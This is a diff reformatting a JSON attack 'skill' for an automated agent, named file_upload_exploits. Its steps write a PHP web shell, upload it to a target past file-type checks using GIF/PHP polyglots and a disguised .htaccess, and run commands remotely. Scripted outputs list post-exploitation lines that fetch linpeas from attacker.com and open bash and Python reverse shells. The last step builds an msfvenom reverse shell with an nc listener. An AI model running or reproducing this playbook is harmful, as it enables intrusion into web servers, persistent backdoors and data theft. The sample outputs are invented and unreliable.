@@ -2,37 +2,134 @@
   "name": "file_upload_exploits",
   "description": "File upload vulnerabilities for web shell deployment and remote code execution",
   "pattern": "file.*upload|web.*shell|php.*shell|upload.*bypass",
-  "parameters": ["target_url", "upload_endpoint", "file_type"],
+  "parameters": [
+    "target_url",
+    "upload_endpoint",
+    "file_type"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > shell.php << 'EOF'\n<?php\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\nEOF\ncat shell.php"]},
-      "expected_output": {"type": "string", "example": "<?php\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n\nSimple PHP web shell created:\n  Filename: shell.php\n  Functionality: Executes system commands via GET parameter 'cmd'\n  Usage: http://target.com/uploads/shell.php?cmd=whoami\n  \nShell capabilities:\n  - Execute arbitrary system commands\n  - Read/write files\n  - Download additional payloads\n  - Establish reverse shell\n  \nMore advanced shells:\n  - p0wny-shell: Full terminal interface\n  - WSO (Web Shell by Orb): File manager, SQL client\n  - c99: Database management, file operations\n  - b374k: Password-protected, obfuscated\n  \nTesting upload:\n  curl -F \"file=@shell.php\" http://target.com/upload.php"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > shell.php << 'EOF'\n<?php\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\nEOF\ncat shell.php"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<?php\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n\nSimple PHP web shell created:\n  Filename: shell.php\n  Functionality: Executes system commands via GET parameter 'cmd'\n  Usage: http://target.com/uploads/shell.php?cmd=whoami\n  \nShell capabilities:\n  - Execute arbitrary system commands\n  - Read/write files\n  - Download additional payloads\n  - Establish reverse shell\n  \nMore advanced shells:\n  - p0wny-shell: Full terminal interface\n  - WSO (Web Shell by Orb): File manager, SQL client\n  - c99: Database management, file operations\n  - b374k: Password-protected, obfuscated\n  \nTesting upload:\n  curl -F \"file=@shell.php\" http://target.com/upload.php"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["-F", "file=@shell.php", "http://target.com/upload.php", "-v"]},
-      "expected_output": {"type": "string", "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> POST /upload.php HTTP/1.1\n> Host: target.com\n> Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n> Content-Length: 256\n> \n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=UTF-8\n< \n{\n  \"status\": \"error\",\n  \"message\": \"Only image files are allowed (jpg, png, gif)\"\n}\n\nUpload rejected!\n  Reason: File type validation\n  Filter: Checks file extension\n  Allowed: jpg, png, gif\n  Blocked: php\n  \nBypass techniques:\n  1. Double extension: shell.php.jpg\n  2. Null byte injection: shell.php%00.jpg\n  3. Case variation: shell.pHp, shell.PHP\n  4. Alternative extensions: .php3, .php4, .php5, .phtml, .phar\n  5. MIME type manipulation\n  6. Magic bytes injection (add image header)\n  \nTrying bypass methods..."}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-F",
+          "file=@shell.php",
+          "http://target.com/upload.php",
+          "-v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> POST /upload.php HTTP/1.1\n> Host: target.com\n> Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n> Content-Length: 256\n> \n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=UTF-8\n< \n{\n  \"status\": \"error\",\n  \"message\": \"Only image files are allowed (jpg, png, gif)\"\n}\n\nUpload rejected!\n  Reason: File type validation\n  Filter: Checks file extension\n  Allowed: jpg, png, gif\n  Blocked: php\n  \nBypass techniques:\n  1. Double extension: shell.php.jpg\n  2. Null byte injection: shell.php%00.jpg\n  3. Case variation: shell.pHp, shell.PHP\n  4. Alternative extensions: .php3, .php4, .php5, .phtml, .phar\n  5. MIME type manipulation\n  6. Magic bytes injection (add image header)\n  \nTrying bypass methods..."
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "# Add GIF header to PHP shell\ncat > shell.php.gif << 'EOF'\nGIF89a;\n<?php\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\nEOF\nxxd shell.php.gif | head -5"]},
-      "expected_output": {"type": "string", "example": "00000000: 4749 4638 3961 3b0a 3c3f 7068 700a 6966  GIF89a;.<?php.if\n00000010: 2869 7373 6574 2824 5f47 4554 5b27 636d  (isset($_GET['cm\n00000020: 6427 5d29 2920 7b0a 2020 2020 7379 7374  d'])) {.    syst\n00000030: 656d 2824 5f47 4554 5b27 636d 6427 5d29  em($_GET['cmd'])\n00000040: 3b0a 7d0a 3f3e 0a                        ;.}.?>.\n\nPolyglot file created!\n  Filename: shell.php.gif\n  Magic bytes: GIF89a (valid GIF header)\n  Content: PHP web shell code\n  \nFile is both:\n  - Valid GIF (passes magic byte check)\n  - Valid PHP (executes code)\n  \nBypass validation:\n  - MIME type check: Appears as image/gif\n  - Magic bytes check: Valid GIF header (47 49 46 38 39 61)\n  - File extension: .gif (allowed)\n  \nExecution:\n  If .gif files parsed by PHP (misconfiguration):\n    http://target.com/uploads/shell.php.gif?cmd=whoami\n  \nOther polyglots:\n  - JPEG + PHP: FF D8 FF E0 ... <?php ... ?>\n  - PNG + PHP: 89 50 4E 47 ... <?php ... ?>"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "# Add GIF header to PHP shell\ncat > shell.php.gif << 'EOF'\nGIF89a;\n<?php\nif(isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\nEOF\nxxd shell.php.gif | head -5"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "00000000: 4749 4638 3961 3b0a 3c3f 7068 700a 6966  GIF89a;.<?php.if\n00000010: 2869 7373 6574 2824 5f47 4554 5b27 636d  (isset($_GET['cm\n00000020: 6427 5d29 2920 7b0a 2020 2020 7379 7374  d'])) {.    syst\n00000030: 656d 2824 5f47 4554 5b27 636d 6427 5d29  em($_GET['cmd'])\n00000040: 3b0a 7d0a 3f3e 0a                        ;.}.?>.\n\nPolyglot file created!\n  Filename: shell.php.gif\n  Magic bytes: GIF89a (valid GIF header)\n  Content: PHP web shell code\n  \nFile is both:\n  - Valid GIF (passes magic byte check)\n  - Valid PHP (executes code)\n  \nBypass validation:\n  - MIME type check: Appears as image/gif\n  - Magic bytes check: Valid GIF header (47 49 46 38 39 61)\n  - File extension: .gif (allowed)\n  \nExecution:\n  If .gif files parsed by PHP (misconfiguration):\n    http://target.com/uploads/shell.php.gif?cmd=whoami\n  \nOther polyglots:\n  - JPEG + PHP: FF D8 FF E0 ... <?php ... ?>\n  - PNG + PHP: 89 50 4E 47 ... <?php ... ?>"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["-F", "file=@shell.php.gif", "-H", "Content-Type: image/gif", "http://target.com/upload.php"]},
-      "expected_output": {"type": "string", "example": "{\n  \"status\": \"success\",\n  \"message\": \"File uploaded successfully\",\n  \"filename\": \"shell.php.gif\",\n  \"path\": \"/uploads/a1b2c3d4e5f6g7h8_shell.php.gif\",\n  \"url\": \"http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif\"\n}\n\nUpload successful!\n  Filename: a1b2c3d4e5f6g7h8_shell.php.gif\n  Path: /uploads/a1b2c3d4e5f6g7h8_shell.php.gif\n  URL: http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif\n  \nBypass method: Polyglot file (GIF + PHP)\n  Passed: MIME type check (image/gif)\n  Passed: Magic bytes check (GIF89a)\n  Passed: File extension check (.gif)\n  \nTesting execution:\n  curl 'http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif?cmd=whoami'"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-F",
+          "file=@shell.php.gif",
+          "-H",
+          "Content-Type: image/gif",
+          "http://target.com/upload.php"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n  \"status\": \"success\",\n  \"message\": \"File uploaded successfully\",\n  \"filename\": \"shell.php.gif\",\n  \"path\": \"/uploads/a1b2c3d4e5f6g7h8_shell.php.gif\",\n  \"url\": \"http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif\"\n}\n\nUpload successful!\n  Filename: a1b2c3d4e5f6g7h8_shell.php.gif\n  Path: /uploads/a1b2c3d4e5f6g7h8_shell.php.gif\n  URL: http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif\n  \nBypass method: Polyglot file (GIF + PHP)\n  Passed: MIME type check (image/gif)\n  Passed: Magic bytes check (GIF89a)\n  Passed: File extension check (.gif)\n  \nTesting execution:\n  curl 'http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif?cmd=whoami'"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif?cmd=whoami"]},
-      "expected_output": {"type": "string", "example": "GIF89a;\nwww-data\n\nRemote Code Execution achieved!\n  Command: whoami\n  Output: www-data\n  Method: PHP execution via .gif file\n  \nVulnerability confirmed:\n  - Unrestricted file upload\n  - PHP execution in upload directory\n  - No content filtering\n  \nPost-exploitation:\n  1. Enumerate system:\n     ?cmd=uname -a\n     ?cmd=cat /etc/passwd\n     ?cmd=ls -la /var/www/html\n  \n  2. Download tools:\n     ?cmd=wget http://attacker.com/linpeas.sh -O /tmp/linpeas.sh\n     ?cmd=chmod +x /tmp/linpeas.sh\n  \n  3. Reverse shell:\n     ?cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\n  \n  4. Upgrade shell:\n     ?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif?cmd=whoami"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "GIF89a;\nwww-data\n\nRemote Code Execution achieved!\n  Command: whoami\n  Output: www-data\n  Method: PHP execution via .gif file\n  \nVulnerability confirmed:\n  - Unrestricted file upload\n  - PHP execution in upload directory\n  - No content filtering\n  \nPost-exploitation:\n  1. Enumerate system:\n     ?cmd=uname -a\n     ?cmd=cat /etc/passwd\n     ?cmd=ls -la /var/www/html\n  \n  2. Download tools:\n     ?cmd=wget http://attacker.com/linpeas.sh -O /tmp/linpeas.sh\n     ?cmd=chmod +x /tmp/linpeas.sh\n  \n  3. Reverse shell:\n     ?cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\n  \n  4. Upgrade shell:\n     ?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "# Create .htaccess to enable PHP execution for all files\ncat > htaccess.gif << 'EOF'\nGIF89a;\nAddType application/x-httpd-php .gif\nEOF\ncurl -F 'file=@htaccess.gif' http://target.com/upload.php"]},
-      "expected_output": {"type": "string", "example": "{\n  \"status\": \"success\",\n  \"message\": \"File uploaded successfully\",\n  \"filename\": \"htaccess.gif\",\n  \"path\": \"/uploads/b2c3d4e5f6g7h8i9_htaccess.gif\"\n}\n\nApache .htaccess uploaded!\n  Filename: htaccess.gif (disguised)\n  Content: AddType application/x-httpd-php .gif\n  Effect: All .gif files in /uploads/ now execute as PHP\n  \nRename .htaccess:\n  curl 'http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif?cmd=mv /var/www/html/uploads/b2c3d4e5f6g7h8i9_htaccess.gif /var/www/html/uploads/.htaccess'\n  \nNow ALL uploaded .gif files execute as PHP!\n  - shell.php.gif → executes\n  - image.gif with PHP → executes\n  - any .gif → potential backdoor\n  \nAlternative .htaccess payloads:\n  - AddHandler application/x-httpd-php .jpg\n  - SetHandler application/x-httpd-php\n  - php_flag engine on\n  \nOther upload directory attacks:\n  1. Upload .htaccess to enable PHP\n  2. Upload web.config (IIS) to enable ASP\n  3. Upload .user.ini (PHP-FPM) to set directives"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "# Create .htaccess to enable PHP execution for all files\ncat > htaccess.gif << 'EOF'\nGIF89a;\nAddType application/x-httpd-php .gif\nEOF\ncurl -F 'file=@htaccess.gif' http://target.com/upload.php"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n  \"status\": \"success\",\n  \"message\": \"File uploaded successfully\",\n  \"filename\": \"htaccess.gif\",\n  \"path\": \"/uploads/b2c3d4e5f6g7h8i9_htaccess.gif\"\n}\n\nApache .htaccess uploaded!\n  Filename: htaccess.gif (disguised)\n  Content: AddType application/x-httpd-php .gif\n  Effect: All .gif files in /uploads/ now execute as PHP\n  \nRename .htaccess:\n  curl 'http://target.com/uploads/a1b2c3d4e5f6g7h8_shell.php.gif?cmd=mv /var/www/html/uploads/b2c3d4e5f6g7h8i9_htaccess.gif /var/www/html/uploads/.htaccess'\n  \nNow ALL uploaded .gif files execute as PHP!\n  - shell.php.gif → executes\n  - image.gif with PHP → executes\n  - any .gif → potential backdoor\n  \nAlternative .htaccess payloads:\n  - AddHandler application/x-httpd-php .jpg\n  - SetHandler application/x-httpd-php\n  - php_flag engine on\n  \nOther upload directory attacks:\n  1. Upload .htaccess to enable PHP\n  2. Upload web.config (IIS) to enable ASP\n  3. Upload .user.ini (PHP-FPM) to set directives"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "# Create reverse shell payload\nmsfvenom -p php/reverse_php LHOST=10.10.14.50 LPORT=4444 -f raw > reverse.php\n# Add GIF header\necho 'GIF89a;' | cat - reverse.php > reverse.php.gif\n# Start listener\nnc -nlvp 4444 &\nLISTENER_PID=$!\necho \"Listener PID: $LISTENER_PID\"\n# Upload shell\ncurl -F 'file=@reverse.php.gif' http://target.com/upload.php\necho 'Upload complete. Triggering shell...'\n# Trigger execution\ncurl http://target.com/uploads/reverse.php.gif"]},
-      "expected_output": {"type": "string", "example": "[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder specified, outputting raw payload\nPayload size: 3033 bytes\n\nListener PID: 12345\nListening on 0.0.0.0 4444\n\n{\n  \"status\": \"success\",\n  \"message\": \"File uploaded successfully\",\n  \"filename\": \"reverse.php.gif\",\n  \"path\": \"/uploads/c3d4e5f6g7h8i9j0_reverse.php.gif\"\n}\n\nUpload complete. Triggering shell...\n\nConnection received on 192.168.1.100 45678\n\nPHP Reverse Shell established!\n  Listener: 10.10.14.50:4444\n  Victim: 192.168.1.100:45678\n  Shell type: PHP reverse shell\n  Generated: msfvenom\n  \nInteractive commands:\n# whoami\nwww-data\n\n# pwd\n/var/www/html/uploads\n\n# ls -la /var/www/html\ndrwxr-xr-x 5 www-data www-data  4096 Jan 15 14:30 .\ndrwxr-xr-x 3 root     root      4096 Dec 10 10:15 ..\n-rw-r--r-- 1 www-data www-data  2847 Jan 15 14:25 config.php\ndrwxrwxrwx 2 www-data www-data  4096 Jan 15 15:45 uploads\n\nFull interactive shell via file upload!\n  Privilege: www-data\n  Access: Web application directory\n  \nNext steps:\n  - Privilege escalation\n  - Lateral movement\n  - Data exfiltration"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "# Create reverse shell payload\nmsfvenom -p php/reverse_php LHOST=10.10.14.50 LPORT=4444 -f raw > reverse.php\n# Add GIF header\necho 'GIF89a;' | cat - reverse.php > reverse.php.gif\n# Start listener\nnc -nlvp 4444 &\nLISTENER_PID=$!\necho \"Listener PID: $LISTENER_PID\"\n# Upload shell\ncurl -F 'file=@reverse.php.gif' http://target.com/upload.php\necho 'Upload complete. Triggering shell...'\n# Trigger execution\ncurl http://target.com/uploads/reverse.php.gif"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder specified, outputting raw payload\nPayload size: 3033 bytes\n\nListener PID: 12345\nListening on 0.0.0.0 4444\n\n{\n  \"status\": \"success\",\n  \"message\": \"File uploaded successfully\",\n  \"filename\": \"reverse.php.gif\",\n  \"path\": \"/uploads/c3d4e5f6g7h8i9j0_reverse.php.gif\"\n}\n\nUpload complete. Triggering shell...\n\nConnection received on 192.168.1.100 45678\n\nPHP Reverse Shell established!\n  Listener: 10.10.14.50:4444\n  Victim: 192.168.1.100:45678\n  Shell type: PHP reverse shell\n  Generated: msfvenom\n  \nInteractive commands:\n# whoami\nwww-data\n\n# pwd\n/var/www/html/uploads\n\n# ls -la /var/www/html\ndrwxr-xr-x 5 www-data www-data  4096 Jan 15 14:30 .\ndrwxr-xr-x 3 root     root      4096 Dec 10 10:15 ..\n-rw-r--r-- 1 www-data www-data  2847 Jan 15 14:25 config.php\ndrwxrwxrwx 2 www-data www-data  4096 Jan 15 15:45 uploads\n\nFull interactive shell via file upload!\n  Privilege: www-data\n  Access: Web application directory\n  \nNext steps:\n  - Privilege escalation\n  - Lateral movement\n  - Data exfiltration"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
